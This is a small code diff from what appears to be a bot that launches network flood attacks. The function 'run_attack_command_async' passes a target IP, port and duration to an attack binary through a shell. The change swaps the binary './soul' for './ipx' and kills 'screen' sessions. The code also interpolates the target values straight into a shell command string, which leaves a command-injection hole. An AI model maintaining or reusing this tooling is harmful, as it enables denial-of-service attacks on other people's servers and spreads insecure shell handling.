@@ -305,7 +305,7 @@ def process_attack_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration):
     attack_process = asyncio.create_subprocess_shell(
-        f"./soul {target_ip} {target_port} {duration} 900"
+        f"./ipx {target_ip} {target_port} {duration}"
     )
     pkill_process = asyncio.create_subprocess_shell("pkill screen")
 
